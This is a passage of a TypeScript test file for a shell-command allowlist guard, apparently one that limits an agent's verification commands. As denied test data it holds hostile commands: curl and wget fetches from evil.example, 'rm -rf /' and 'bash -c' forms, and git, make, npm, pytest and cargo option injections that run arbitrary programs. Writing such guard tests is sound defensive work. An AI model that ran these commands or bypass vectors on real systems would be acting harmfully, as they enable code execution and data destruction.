import assert from "node:assert/strict"
import { test } from "node:test"

import { guardVerifyCommand, validateDiffBase, validateVerifyCwd } from "./guards.ts"

/** Asserts a command is denied and the reason names the expected token or rule. */
function assertDenied(command: string, reasonPart: string): void {
  const verdict = guardVerifyCommand(command)
  assert.equal(verdict.ok, false, `${command} must be denied`)
  if (!verdict.ok) {
    assert.ok(
      verdict.reason.includes(reasonPart),
      `${command} → reason should mention "${reasonPart}", got "${verdict.reason}"`,
    )
  }
}

/** Asserts a command passes the guard. */
function assertAllowed(command: string): void {
  const verdict = guardVerifyCommand(command)
  assert.equal(verdict.ok, true, `${command} must be allowed${verdict.ok ? "" : `: ${verdict.reason}`}`)
}

// ------------------------------------------------------ denied characters

test("denies substitution, expansion, redirection, pipe, separator and line-break characters anywhere", () => {
  assertDenied("npm test `whoami`", "backtick")
  assertDenied("echo $HOME", "dollar sign")
  assertDenied("npm test $(whoami)", "dollar sign")
  assertDenied("bash (cd /tmp)", "open parenthesis")
  assertDenied("echo (x)", "open parenthesis")
  assertDenied("npm test > /etc/passwd", "greater-than")
  assertDenied("npm test < /etc/passwd", "less-than")
  assertDenied("npm test | tee out.txt", "pipe")
  assertDenied("npm test; rm -rf build", "semicolon")
  assertDenied("npm test\nrm -rf build", "newline")
  assertDenied("npm test\rwhoami", "carriage return")
  assertDenied("npm test &", "backgrounding")
  assertDenied("npm test & sleep 1", "backgrounding")
  assertDenied("npm test || true", "pipe")
})

test("denies an unquoted backslash, which the shell removes before the command sees the word", () => {
  for (const command of [
    "pytest \\-p evil",
    "cargo \\-\\-config=build.rustc-wrapper=/bin/echo",
    "make \\-f /tmp/evil.mk",
    "node \\-r ./evil.js",
    "git fetch \\-\\-upload-pack=id origin",
    "rg \\-\\-pre=/tmp/pw.sh pattern f",
    "go test \\-exec ./evil ./...",
    "sort \\-o out.txt in.txt",
  ]) {
    assertDenied(command, "unquoted backslash")
  }
  // Inside quotes the shell keeps the backslash as data, so the guards for
  // `-k` and a plain echo argument still pass.
  assertAllowed("pytest -k 'a\\-b'")
  assertAllowed("echo 'a\\b'")
  assertAllowed('pytest -k "a\\-b"')
})

test("denies unquoted glob and brace metacharacters while quoted patterns pass", () => {
  assertDenied("pytest *", "unquoted glob")
  assertDenied("node --test tests/*.js", "unquoted glob")
  assertDenied("pytest tests/?_x.py", "unquoted glob")
  assertDenied("echo [ab]", "unquoted glob")
  assertDenied("echo {a,b}", "unquoted brace")
  assertAllowed('pytest -k "test_*"')
  assertAllowed("pytest -k 'test_[ab]'")
  assertAllowed('rg -n --glob "*.ts" pattern tools/')
})

test("a quoted closing brace does not end a brace expansion early", () => {
  // The close must be found with quote tracking: `{x"}"y,-p}` has a quoted
  // `}` and a comma after it, and `indexOf("}")` stopped at the quoted one.
  assertDenied('pytest {x"}"y,-p}', "brace expansion")
  assertDenied("pytest {x'}'y,-p}", "brace expansion")
  assertDenied('pytest {"}"x,-p}', "brace expansion")
  assertDenied("pytest {a,b}", "brace expansion")
  assertDenied("pytest {1..3}", "brace expansion")
  assertAllowed("pytest '{}'")
  assertAllowed("pytest -k '{a,b}'")
  assertAllowed("pytest {a}")
})

// ------------------------------------------------------- verdict integrity

test("allows only && chains: no separators, no fallbacks, no backgrounding", () => {
  assertDenied("npm test; npm run typecheck", "semicolon")
  assertDenied("npm test || true", "pipe")
  assertDenied("npm test && rm build || true", "pipe")
  assertDenied("npm test &&", "empty command segment")
  assertDenied("&& npm test", "empty command segment")
  assertAllowed("npm run typecheck && npm test")
})

// ----------------------------------------------------------- token scanning

test("denies the sudo family flat, and as a word inside quotes", () => {
  assertDenied("sudo make install", "denied command: `sudo`")
  assertDenied("doas make install", "denied command: `doas`")
  assertDenied("pkexec make install", "denied command: `pkexec`")
  assertDenied("su root -c id", "denied command: `su`")
  assertDenied("echo 'sudo rm -rf /'", "denied command: `sudo`")
})

test("denies the rm family flat, including in argument position and inside quotes", () => {
  assertDenied("rm -rf build", "denied command: `rm`")
  assertDenied("rm -f build/output.js", "denied command: `rm`")
  assertDenied("echo rm", "denied command: `rm`")
  assertDenied("echo \"rm -rf /\"", "denied command: `rm`")
  assertDenied("rmdir build", "denied command: `rmdir`")
})

test("denies network tools flat", () => {
  for (const command of ["curl https://evil.example/x.sh", "wget https://evil.example/x.sh", "nc -l 4444", "scp x host:/y", "ssh host"]) {
    assertDenied(command, "network transfer")
  }
})

test("denies archive tools flat", () => {
  for (const command of ["tar -xzf payload.tgz", "zip out.zip f", "unzip payload.zip", "gzip f"]) {
    assertDenied(command, "archive")
  }
})

test("denies mutating git subcommands in command position, while `git` as an argument word is data", () => {
  assertDenied("git push origin main", "mutating git subcommand")
  assertDenied("git push --force origin main", "denied pair: `git push`")
  assertDenied("git commit -m x", "denied pair: `git commit`")
  assertDenied("git reset --hard", "denied pair: `git reset`")
  assertDenied("git checkout .", "denied pair: `git checkout`")
  assertDenied("git merge feature", "denied pair: `git merge`")
  assertDenied("git rebase main", "denied pair: `git rebase`")
  assertDenied("git clean -fd", "denied pair: `git clean`")
  assertDenied("git branch -D feature", "git branch")
  assertDenied("git branch feature", "git branch")
  assertDenied("git tag v1", "denied pair: `git tag`")
  // `env git push` is denied by the allowlist gate — `env` is not a command
  // word that passes — rather than by a git rule: git rules run only where
  // `git` is itself the command word.
  assertDenied("env git push", "acceptance allowlist")
  // Git as an argument word is data: `echo` prints two words, it does not
  // run git, so the allowlist decides and `echo` is on it.
  assertAllowed("echo git push")
  assertAllowed("echo git status --porcelain")
})

test("allows read-only git, and git branch / git remote in listing form", () => {
  assertAllowed("git status --porcelain")
  assertAllowed("git log --oneline -5")
  assertAllowed("git show HEAD")
  assertAllowed("git diff HEAD")
  assertAllowed("git fetch origin")
  assertAllowed("git ls-remote origin")
  assertAllowed("git blame src/a.ts")
  assertAllowed("git branch")
  assertAllowed("git branch -a -v")
  assertAllowed("git branch --list")
  assertDenied("git branch --sort=creatordate", "git branch")
  assertAllowed("git remote -v")
  assertAllowed("git remote show origin")
  // Read-only git that is not on the subcommand allowlist stays denied —
  // the allowlist is explicit, not a read-only inference.
  assertDenied("git worktree list", "git worktree")
  assertDenied("git stash list", "git stash")
  assertDenied("git submodule status", "git submodule")
  assertDenied("git bisect log", "git bisect")
})

test("denies package install, publish and exec subcommands", () => {
  assertDenied("npm publish", "denied pair: `npm publish`")
  assertDenied("npm i -g typescript", "denied pair: `npm i`")
  assertDenied("npm install", "denied pair: `npm install`")
  assertDenied("npm ci", "denied pair: `npm ci`")
  assertDenied("npm exec evil", "denied pair: `npm exec`")
  assertDenied("pnpm add evil", "denied pair: `pnpm add`")
  assertDenied("yarn add evil", "denied pair: `yarn add`")
  assertDenied("bun install", "denied pair: `bun install`")
  assertDenied("pip install evil", "denied pair: `pip install`")
  assertDenied("pip3 install evil", "denied pair: `pip3 install`")
  assertDenied("python -m pip install evil", "module: `pip`")
  assertDenied("gem install evil", "denied pair: `gem install`")
  assertDenied("go run main.go", "denied pair: `go run`")
  assertDenied("go install example.com/x", "denied pair: `go install`")
  assertDenied("uv pip install evil", "denied pair: `uv pip`")
  assertDenied("cargo publish", "denied pair: `cargo publish`")
  assertDenied("npm run build && npm publish", "denied pair: `npm publish`")
})

test("allows only npm test, run and ls — every other package manager and npm subcommand is denied", () => {
  assertAllowed("npm test")
  assertAllowed("npm run typecheck")
  assertAllowed("npm run eval -- --check")
  assertAllowed("npm run build && npm test")
  assertAllowed("npm ls --depth=0")
  // The allowlist replaced the package-manager denylist: npx (registry code
  // execution), every non-npm manager, and every other npm subcommand go.
  assertDenied("npx tsc --noEmit", "acceptance allowlist")
  assertDenied("npx --yes @playwright/mcp@0.0.83 --isolated", "acceptance allowlist")
  assertDenied("npm outdated", "only test, run and ls pass")
  // Quality B: the subcommand must immediately follow `npm` — ANY option in
  // that position fails closed, not just the ones a parser would skip.
  assertDenied("npm -q test", "npm option before the subcommand")
  assertDenied("npm --silent run build", "npm option before the subcommand")
  assertDenied("pnpm --filter web run build", "acceptance allowlist")
  assertDenied("yarn test", "acceptance allowlist")
})

test("allows polyglot test runners: pytest, go test/vet, cargo test/check/clippy, make, node and python3", () => {
  assertAllowed("pytest")
  assertAllowed("pytest tests/")
  assertAllowed("pytest -v -k unit")
  assertAllowed("pytest --cov=src")
  assertAllowed("go test ./...")
  assertAllowed("go test -v -race ./...")
  assertAllowed("go vet ./...")
  assertAllowed("cargo test")
  assertAllowed("cargo test --all")
  assertAllowed("cargo check")
  assertAllowed("cargo clippy")
  assertAllowed("make")
  assertAllowed("make test")
  assertAllowed("make check")
  assertAllowed("node --test")
  assertAllowed("node tests/runner.js")
  assertAllowed("python3 -m unittest")
  assertAllowed("python3 -m pytest")
  assertAllowed("python3 tests/run.py")
  assertAllowed("python -m unittest")
})

test("denies unsafe subcommands and flags on polyglot runners", () => {
  assertDenied("go run main.go", "go run")
  assertDenied("go install example.com/x", "go install")
  assertDenied("go build", "only test and vet pass")
  assertDenied("go test -exec ./evil", "not in go's flag allowlist")
  assertDenied("go test -toolexec ./evil ./...", "not in go's flag allowlist")
  assertDenied("go vet --toolexec=./evil ./...", "not in go's flag allowlist")
  assertDenied("go vet -vettool=./evil ./...", "not in go's flag allowlist")
  assertDenied("go vet --vettool=./evil ./...", "not in go's flag allowlist")
  assertDenied("go test -args -test.v ./...", "not in go's flag allowlist")
  assertDenied("cargo run", "only test, check and clippy pass")
  assertDenied("cargo install foo", "cargo install")
  assertDenied("cargo publish", "cargo publish")
  assertDenied("cargo build", "only test, check and clippy pass")
  assertDenied("cargo test --config build.rustc-wrapper=/bin/echo", "--config")
  assertDenied("cargo test -Z unstable-options", "not in cargo's flag allowlist")
  assertDenied("cargo test --manifest-path /tmp/evil/Cargo.toml", "--manifest-path")
  assertDenied("pytest --pdb", "--pdb")
  assertDenied("pytest --trace", "--trace")
  assertDenied("pytest -p evil", "not in pytest's flag allowlist")
  assertDenied("pytest -c evil.ini", "not in pytest's flag allowlist")
  assertDenied("pytest --config-file evil.ini", "--config-file")
  assertDenied("pytest -o addopts=evil", "not in pytest's flag allowlist")
  assertDenied("pytest --override-ini addopts=evil", "--override-ini")
  assertDenied("make -C /tmp", "not in make's flag allowlist")
  assertDenied("make --directory=/tmp", "not in make's flag allowlist")
  assertDenied("make -f /tmp/evil.mk", "not in make's flag allowlist")
  assertDenied("make -I /tmp", "not in make's flag allowlist")
  assertDenied("make -E evil test", "not in make's flag allowlist")
  assertDenied("make --eval \"evil\"", "not in make's flag allowlist")
  assertDenied("node -e 'console.log(1)'", "denied")
  assertDenied("node -e process.exit", "node with an eval flag")
  assertDenied("node -p 'process.env'", "not in node's flag allowlist")
  assertDenied("node --print '1+1'", "not in node's flag allowlist")
  assertDenied("node --experimental-loader=evil tests/run.js", "not in node's flag allowlist")
  assertDenied("node -r evil tests/run.js", "not in node's flag allowlist")
  assertDenied("node -i", "not in node's flag allowlist")
  assertDenied("node --watch tests/run.js", "not in node's flag allowlist")
  assertDenied("node --test-reporter=evil tests/run.js", "allowed values: spec, tap, dot, junit")
  assertDenied("python3 -c 'import os'", "python with -c")
  assertDenied("python3 -i tests/run.py", "not in python3's flag allowlist")
})

test("a value-taking runner option does not consume a dash-leading token as its value", () => {
  // These passed before the value rule: `--target` swallowed the next option,
  // so `--config`, `--manifest-path` and `-Z` were never checked against the
  // table. A dash-leading word is another option, not a value.
  for (const command of [
    "cargo check --target --config=build.rustc-wrapper=/bin/echo",
    "cargo check --target --manifest-path=/tmp/evil/Cargo.toml",
    "cargo check --target -Z",
  ]) {
    assertDenied(command, "requires a value")
  }
  assertAllowed("cargo test -j 4")
  assertAllowed("pytest -k unit")
})

test("cargo --target accepts a triple or built-in name, not a custom target path", () => {
  // A target JSON has a linker field naming a program cargo would run, so the
  // value is restricted to the characters a triple uses. A bare file name is
  // still a file: `target.json` names a custom spec, so it is refused too.
  for (const target of [
    "x86_64-unknown-linux-gnu",
    "aarch64-apple-darwin",
    "wasm32-unknown-unknown",
    "thumbv7em-none-eabihf",
  ]) {
    assertAllowed(`cargo test --target ${target}`)
    assertAllowed(`cargo test --target=${target}`)
  }
  assertDenied("cargo test --target target.json", "value does not match")
  assertDenied("cargo test --target=target.json", "value does not match")
  assertDenied("cargo test --target target.JSON", "value does not match")
  assertDenied("cargo test --target /tmp/target.json", "value does not match")
  assertDenied("cargo test --target=/tmp/target.json", "value does not match")
  assertDenied("cargo test --target=../target.json", "value does not match")
})

test("make refuses command-line variable assignments at every position", () => {
  // `MAKEFILES=…` loads another makefile and `SHELL=…` picks the recipe
  // shell; both are positional words, so the rule cannot stop at the first.
  assertDenied("make MAKEFILES=/tmp/evil.mk test", "variable assignment")
  assertDenied("make SHELL=/tmp/evil test", "variable assignment")
  assertDenied("make test VAR=1", "variable assignment")
  // GNU make leaves a non-numeric word after `-j` alone, so this is an
  // assignment rather than `-j`'s argument.
  assertDenied("make -j MAKEFILES=/tmp/evil.mk test", "variable assignment")
  // The other assignment operators and a dotted variable name are the same
  // escape: `make MAKEFILES:=…` loads the named makefile.
  assertDenied("make MAKEFILES:=/tmp/evil.mk test", "variable assignment")
  assertDenied("make MAKEFILES+=/tmp/evil.mk test", "variable assignment")
  assertDenied("make MAKEFILES.a=/tmp/evil.mk test", "variable assignment")
  // A quoted whitespace-before-operator assignment is one argv word after the
  // shell strips the quotes, and make trims the name before loading the file.
  assertDenied("make 'MAKEFILES =evil.conf'", "variable assignment")
  assertDenied("make 'SHELL =/tmp/evil'", "variable assignment")
  assertDenied("make 'MAKEFLAGS =--eval=evil'", "variable assignment")
  assertDenied("make 'FOO := bar'", "variable assignment")
  assertDenied("make 'FOO += bar'", "variable assignment")
  assertDenied("make 'FOO ?= bar'", "variable assignment")
  // GNU make trims leading blanks and whitespace before the operator, and
  // accepts `:::=` and the shell `!=` form. Each of these is one argv word
  // after the shell strips the quotes.
  assertDenied("make -n ' MAKEFILES=evil.conf' all", "variable assignment")
  assertDenied("make '\tMAKEFILES=evil.conf' pwned", "variable assignment")
  assertDenied("make 'MAKEFILES:::=evil.conf' pwned", "variable assignment")
  assertDenied("make 'MAKEFILES !=echo evil.conf' pwned", "variable assignment")
  assertDenied("make 'X !=touch /tmp/exmarker' probe", "variable assignment")
  assertDenied("make 'FOO::=bar' test", "variable assignment")
  assertDenied("make 'FOO!=bar' test", "variable assignment")
  assertAllowed("make test")
  assertAllowed("make -j4 test")
  assertAllowed("make -j 4 test")
  assertAllowed("make check all")
  assertAllowed("make -n test")
})

test("pytest refuses @argument files, directly and through python -m pytest", () => {
  assertDenied("python3 -m pytest @c3.txt -q", "argument file")
  assertDenied("pytest @c3.txt -q", "argument file")
  assertDenied("pytest @file", "argument file")
  assertAllowed("pytest tests/")
  assertAllowed("python3 -m pytest -q")
})

test("pytest refuses an argument file in an option-value slot", () => {
  // pytest expands the argfile in a value too, so `-k @c.args` loads options
  // (`-c`, `-o`, a plugin) the flag table refuses to see.
  for (const command of [
    "pytest -k @c3.args",
    "pytest -m @c3.args",
    "pytest -k@c3.args",
    "pytest -k=@c3.args",
    "pytest --deselect=@file",
    "pytest --ignore=@file",
    "python3 -m pytest -k @file",
    "python3 -m pytest --deselect=@file",
  ]) {
    assertDenied(command, "argument file")
  }
  assertAllowed("pytest -k unit")
  assertAllowed("pytest tests/")
  assertAllowed("python3 -m pytest -k unit")
  assertAllowed("python3 -m pytest -q")
})

test("pytest treats an @ that is not an argument-file spelling as data", () => {
  // Only `@file`, `=@file` and `-k@file` request expansion. A path segment or
  // keyword expression that happens to contain `@` names no argument file.
  assertAllowed("pytest tests/@fixtures/test_x.py")
  assertAllowed("pytest -k name@example")
  assertAllowed("pytest -k unit")
  assertAllowed("python3 -m pytest -k unit")
})

test("npm refuses the options that redirect its script shell, prefix or configuration", () => {
  for (const [command, reasonPart] of [
    ["npm test --script-shell=/tmp/evil", "--script-shell"],
    ["npm test --shell /tmp/evil", "--shell"],
    ["npm run build --prefix /tmp", "--prefix"],
    ["npm test --userconfig=/tmp/npmrc", "--userconfig"],
    ["npm test --globalconfig /tmp/npmrc", "--globalconfig"],
  ] as const) {
    assertDenied(command, reasonPart)
  }
  assertAllowed("npm test")
  assertAllowed("npm run typecheck")
})

test("npm refuses single-dash and abbreviated forms of the denied options", () => {
  // npm accepts a long option with one dash and any unambiguous prefix, so
  // the five names cannot be matched only in their `--name` spelling.
  for (const command of [
    "npm test -script-shell=/tmp/evil",
    "npm test --script=/tmp/evil",
    "npm test --prefi=/tmp",
    "npm test --userconf=/tmp/npmrc",
    "npm test --globalconf=/tmp/npmrc",
    "npm test --script-shel=/tmp/evil",
  ]) {
    assertDenied(command, "denied npm option")
  }
  assertAllowed("npm test")
  assertAllowed("npm run build")
  assertAllowed("npm ls")
  assertAllowed("npm test --silent")
  assertAllowed("npm test -s")
  assertAllowed("npm run build -- --check")
})

test("the polyglot runner policies are fail-closed flag allowlists", () => {
  // The allowed surface: every option is named in the runner's table, a
  // value-taking flag consumes its value, and the subcommand/module set is
  // closed. These are the eval commands and the shapes the docs use.
  for (const command of [
    "pytest -v -k unit",
    "pytest --cov=src",
    "pytest --cov tests/",
    "pytest tests/",
    "go test -race ./...",
    "go vet ./...",
    "go test -v -race ./...",
    "cargo test --release",
    "cargo clippy -- -D warnings",
    "cargo test -- --test-threads 4 --nocapture",
    "make -j4 test",
    "make -j 4 test",
    "node --test",
    "node --test-reporter=spec tests/run.js",
    "python3 -m unittest",
    "python3 -m pytest -q",
    "python3 -munittest",
  ]) {
    assertAllowed(command)
  }

  // The refused surface. The first two carry parentheses, so the character
  // policy fires before the module policy; the paired `pass` form below proves
  // the module check itself. Everything else names the token or the rule.
  const refused: readonly (readonly [string, string])[] = [
    ['python3 -m timeit -s "print(1)" "1+1"', "denied"],
    ['python3 -mtimeit -s "print(1)" "1+1"', "denied"],
    ["python3 -m timeit -s pass 1", "module: `timeit`"],
    ["python3 -mtimeit -s pass 1", "module: `timeit`"],
    ["python3 -m pdb", "module: `pdb`"],
    ["python3 -m http.server", "module: `http.server`"],
    ["python3 -m pip install x", "module: `pip`"],
    ["cargo test --config build.rustc-wrapper=/bin/echo", "--config"],
    ["cargo test -Z unstable-options", "not in cargo's flag allowlist"],
    ["pytest -p evil", "not in pytest's flag allowlist"],
    ["pytest --pdb", "--pdb"],
    ["go test -toolexec ./evil ./...", "-toolexec"],
    ["go vet -vettool=./evil ./...", "-vettool"],
    ["make -E evil test", "not in make's flag allowlist"],
    ["node -p process.env", "not in node's flag allowlist"],
  ]
  for (const [command, reasonPart] of refused) assertDenied(command, reasonPart)

  // A bare `--` passes only where the subcommand names a post-`--` allowlist.
  assertAllowed("cargo test -- --nocapture")
  assertAllowed("cargo clippy -- -D warnings")
  assertDenied("cargo check --", "no post-`--` allowlist")
  assertDenied("go test -- ./...", "no post-`--` allowlist")
  assertDenied("pytest -- tests/", "no post-`--` allowlist")
  assertDenied("make -- test", "no post-`--` allowlist")
  assertDenied("node -- tests/run.js", "no post-`--` allowlist")
  assertDenied("cargo test -- --unknown-flag", "not in cargo's flag allowlist")
})

test("denies file mutators flat", () => {
  for (const command of [
    "tee out.txt",
    "mv a b",
    "cp a b",
    "chmod 777 x",
    "chown root x",
    "truncate -s 0 log",
    "dd if=/dev/zero of=x",
    "ln -s /etc/passwd link",
  ]) {
    assertDenied(command, "file mutation")
  }
})

// ------------------------------------------------- interpreter/eval pairs

test("denies shell interpreters with -c, including combined flags", () => {
  assertDenied("bash -c 'rm -rf /'", "shell with -c")
  assertDenied("sh -c id", "shell with -c")
  assertDenied("bash -ec id", "shell with -c")
  assertDenied("zsh -c id", "shell with -c")
  assertAllowed("bash -n install.sh")
  assertAllowed("shellcheck install.sh")
})

test("denies python, node, ruby, perl, php and lua eval flags", () => {
  assertDenied("python -c 'import os'", "python with -c")
  assertDenied("python3 -c 'import os'", "python with -c")
  // The sample code avoids parentheses and semicolons: those characters are
  // denied anywhere in the string, so they would mask the pair being tested.
  assertDenied("node -e process.exit", "node with an eval flag")
  assertDenied("node --eval process.exit", "node with an eval flag")
  assertDenied("node -pe 1", "node with an eval flag")
  assertDenied("ruby -e system", "ruby with -e")
  assertDenied("ruby --eval system", "ruby with -e")
  assertDenied("perl -e print", "perl with -e")
  assertDenied("php -r system", "php with -r")
  assertDenied("lua -e os.execute", "lua with -e")
})

test("denies sed -i in every spelling, and sed itself is off the allowlist", () => {
  assertDenied("sed -i s/a/b/ f", "sed with -i")
  assertDenied("sed -i.bak s/a/b/ f", "sed with -i")
  assertDenied("sed --in-place s/a/b/ f", "sed with -i")
  // sed was removed from the command allowlist: a sed script is a program of
  // its own (`1e sh -c …` executes a shell, `w /path` writes a file,
  // `s///e` executes its replacement), and the acceptance chain never
  // invokes sed — so the dialect is refused rather than parsed.
  assertDenied("sed -n 1,5p f", "acceptance allowlist")
  assertDenied("sed 's/a/b/' f", "acceptance allowlist")
  assertDenied("sed '1e sh -c id' data.txt", "acceptance allowlist")
  assertDenied("sed 'w /tmp/out' f", "acceptance allowlist")
})

test("denies find outright, including its -exec and -delete flags", () => {
  assertDenied("find . -exec rm {} x", "find with -exec")
  assertDenied("find . -delete", "find with -exec")
  // `find` is not on the allowlist: it was never in the read-only utility
  // list, so even the plain listing form is refused by default.
  assertDenied("find . -name '*.ts'", "acceptance allowlist")
})

test("denies eval as a command word but not as a script name", () => {
  assertDenied("eval rm -rf /", "denied command: `eval`")
  assertAllowed("npm run eval -- --check")
})

// ------------------------------------------------------------ install.sh

test("runs install.sh only with --dry-run, and never as a plain script", () => {
  assertAllowed("./install.sh --dry-run")
  assertAllowed("./install.sh --project --dry-run")
  assertAllowed("bash -n install.sh")
  assertDenied("./install.sh", "install.sh may only be run with --dry-run")
  assertDenied("./install.sh --force", "install.sh may only be run with --dry-run")
  // Quality C: the rule is gated on the command word, so `./install.sh -n`
  // cannot borrow the shell syntax-check exemption — `-n` is not an option
  // `./install.sh` understands, it would run the script.
  assertDenied("./install.sh -n", "install.sh may only be run with --dry-run")
  assertDenied("bash install.sh", "install.sh may only be run with --dry-run")
  assertDenied("sh ./install.sh --force", "install.sh may only be run with --dry-run")
})

test("install.sh in argument position is data: readers pass, runners need --dry-run", () => {
  // Quality C: the old rule fired on any segment containing a word named
  // `install.sh`, so reading the file was denied for no safety reason.
  assertAllowed("cat install.sh")
  assertAllowed("grep install.sh README.md")
  assertAllowed("ls install.sh")
  assertAllowed("head -5 ./install.sh")
  // The rule still fires for everything that would execute it.
  assertDenied("bash install.sh -n", "install.sh may only be run with --dry-run")
  assertDenied("shellcheck evil.sh && bash install.sh", "install.sh may only be run with --dry-run")
})

// -------------------------------------------------- the allowed surface

test("the standard acceptance chain passes the guard, whole and in parts", () => {
  assertAllowed(
    "npm run typecheck && npm test && npm run check:claims && ./install.sh --dry-run && npm run eval -- --check && bash -n install.sh",
  )
  assertAllowed("npm run typecheck")
  assertAllowed("npm test")
  assertAllowed("npm run check:claims")
  assertAllowed("bash -n install.sh")
})

test("the allowed surface: read-only inspection commands and chains over them pass", () => {
  for (const command of [
    "git status",
    "git log -1",
    "git branch --show-current",
    "git remote -v",
    "git ls-remote https://github.com/wippa-studios/wippaAGENT.git",
    "grep -rn pattern .",
    "cat README.md",
    "./install.sh --dry-run",
    "bash -n install.sh",
    "git status && git log -1 && cat README.md",
    "npm test && git diff HEAD && grep -rn guard tools/",
  ]) {
    assertAllowed(command)
  }
})

test("the round-2 allowed surface: the acceptance chain, data mentions and ordinary read-only forms pass", () => {
  for (const command of [
    // The full standard chain, unchanged.
    "npm run typecheck && npm test && npm run check:claims && ./install.sh --dry-run && npm run eval -- --check && bash -n install.sh",
    // install.sh as data, git as data (quality C and D).
    "cat install.sh",
    "grep install.sh README.md",
    "echo git push",
    // Ordinary sort/uniq, the static checks, and rg.
    "sort f",
    "sort -n f",
    "uniq f",
    "bash -n install.sh",
    "shellcheck install.sh",
    "rg pattern .",
  ]) {
    assertAllowed(command)
  }
})

// ---------------------------------------------------- the regression battery

test("the regression battery: every string the reviews live-proved ALLOW is now denied with a reason", () => {
  // Each entry was proved against the previous guard. The reason substring
  // pins which rule fires, so a future refactor cannot silently swap the
  // policy while keeping the denial.
  const battery: readonly (readonly [string, string])[] = [
    ["git -c alias.pwn=!id pwn", "git global option"],
    ["git -C . push origin main", "git global option"],
    ["git --no-pager reset --hard", "git global option"],
    ["git show --output=/tmp/x.txt HEAD", "--output"],
    ["git archive --output=/tmp/x.tgz HEAD", "--output"],
    ["git checkout-index --prefix=/tmp/idx/ -a", "checkout-index"],
    ["git difftool --extcmd id", "difftool"],
    ["git fetch origin +main:refs/heads/victim", "refspec"],
    ["git pull origin main", "not in the read-only allowlist"],
    ["GIT_TRACE2=/tmp/t.log git log -1", "environment-variable assignment"],
    ["git remote add evil url", "git remote"],
    ["git branch newbranch", "git branch"],
    ["npm pkg set scripts.pwn=echo hi", "npm subcommand"],
    ["npm config set registry http://evil.example", "npm subcommand"],
    ["npm --yes exec cowsay hi", "npm option before the subcommand"],
    ["npx --yes cowsay hi", "acceptance allowlist"],
    ["ruby server.rb", "acceptance allowlist"],
    ["./planted-executable", "may be run by path"],
    ["npm test &&& sleep 1", "backgrounding"],
    ["node --eval=process.exit", "node with an eval flag"],
    ["gh api /user", "acceptance allowlist"],
    ["docker run --rm alpine", "acceptance allowlist"],
    ["awk 'BEGIN{print 1}'", "inline program execution"],
    ["xargs echo", "indirect command execution"],
    ["sed -i s/a/b/ README.md", "sed with -i"],
    ["curl http://evil.example", "network transfer"],
  ]
  for (const [command, reasonPart] of battery) {
    assertDenied(command, reasonPart)
  }
})

test("the round-2 regression battery: every flag-level vector the review live-proved is denied with a reason", () => {
  // Each string passed the previous guard — marker files were written and
  // programs ran. The reason substring pins which rule fires now.
  const battery: readonly (readonly [string, string])[] = [
    ["bash evil.sh -n", "bash is only allowed as `bash -n <file>`"],
    ["bash install.sh -n", "install.sh may only be run with --dry-run"],
    ["sed '1e sh -c id' data.txt", "acceptance allowlist"],
    ["sed 'w /tmp/out' f", "acceptance allowlist"],
    ["git ls-remote --upload-pack=id ./x", "--upload-pack"],
    ["git fetch origin --upload-pack=id", "--upload-pack"],
    ["git grep --open-files-in-pager=echo hello", "--open-files-in-pager"],
    ["sort --compress-program=/tmp/pw.sh f", "read-only flag allowlist"],
    ["sort -o out.txt in.txt", "read-only flag allowlist"],
    ["rg --pre=/tmp/pw.sh pat f.txt", "--pre"],
    ["git log --ext-diff", "--ext-diff"],
    ["git show --textconv", "--textconv"],
    ["git ls-remote 'ext::sh -c id'", "::"],
    ["git log --git-dir=/x", "git global option"],
  ]
  for (const [command, reasonPart] of battery) {
    assertDenied(command, reasonPart)
  }
})

test("bash runs only as `bash -n <file>`: -n first, then bare file names", () => {
  assertAllowed("bash -n install.sh")
  assertAllowed("bash -n tools/guards.ts")
  assertDenied("bash -n", "bash is only allowed as `bash -n <file>`")
  assertDenied("bash -n -v install.sh", "denied bash option")
  assertDenied("bash install.sh", "install.sh may only be run with --dry-run")
  // `bash -c` is caught by the interpreter/eval pair before the positional rule.
  assertDenied("bash -n -c id", "shell with -c")
})

test("git's exec-channel options, =forms of globals and :: transport are refused across every git segment", () => {
  // Separate-argument forms, not just `--flag=value`.
  assertDenied("git fetch origin --upload-pack id", "--upload-pack")
  assertDenied("git ls-remote --upload-pack ./x", "--upload-pack")
  assertDenied("git grep --open-files-in-pager id hello", "--open-files-in-pager")
  // `-O` is the short form of --open-files-in-pager: attached, separate and
  // bare forms all run the named program (or the one git's pager config names).
  assertDenied("git grep -O/bin/sh -- hello", "-O")
  assertDenied("git grep -O ./pg.sh -- hello", "-O")
  assertDenied("git grep -O -- hello", "-O")
  assertDenied("git grep -O", "-O")
  assertAllowed("git grep -n hello")
  assertAllowed("git grep hello")
  assertDenied("git diff --ext-diff HEAD", "--ext-diff")
  assertDenied("git blame --textconv file.ts", "--textconv")
  assertDenied("git log --git-dir /x", "git global option")
  assertDenied("git status --exec-path=/bin", "git global option")
  assertDenied("git shortlog 'ext::sh -c id'", "::")
  // The read-only surface around them is untouched.
  assertAllowed("git log --oneline -3")
  assertAllowed("git fetch origin")
  assertAllowed("git remote show origin")
})

test("git long options match any unambiguous prefix, including exec channels and --output", () => {
  // Git accepts a prefix of a long option: `--up=…` reaches --upload-pack,
  // which runs the named program. Exact matching alone missed every form.
  const denied: readonly (readonly [string, string])[] = [
    ["git ls-remote --u=/tmp/pw origin", "--upload-pack"],
    ["git ls-remote --up=/tmp/pw origin", "--upload-pack"],
    ["git ls-remote --upl=/tmp/pw origin", "--upload-pack"],
    ["git ls-remote --upload-p=/tmp/pw origin", "--upload-pack"],
    ["git ls-remote --upload-pack=/tmp/pw origin", "--upload-pack"],
    ["git grep --open=echo hello", "--open-files-in-pager"],
    ["git grep --open-files-in-pager=echo hello", "--open-files-in-pager"],
    ["git diff --ext HEAD", "--ext-diff"],
    ["git diff --ext-diff HEAD", "--ext-diff"],
    ["git blame --textc f", "--textconv"],
    ["git blame --textconv f", "--textconv"],
    ["git show --out=/tmp/x HEAD", "--output"],
    ["git diff --out /tmp/x HEAD", "--output"],
    ["git log --outp=/tmp/x", "--output"],
    ["git -c alias.pwn=id pwn", "git global option"],
  ]
  for (const [command, reasonPart] of denied) assertDenied(command, reasonPart)
  // The read-only surface is untouched: none of these heads prefixes a denied
  // long option.
  assertAllowed("git log --oneline")
  assertAllowed("git diff --stat")
  assertAllowed("git show --name-only")
  assertAllowed("git log --oneline -3")
})

test("sort and uniq accept only their read-only flag allowlist", () => {
  for (const command of [
    "sort f",
    "sort -n f",
    "sort -nr f",
    "sort --reverse f",
    "sort -u names.txt",
    "uniq f",
    "uniq -c f",
  ]) {
    assertAllowed(command)
  }
  for (const [command, reasonPart] of [
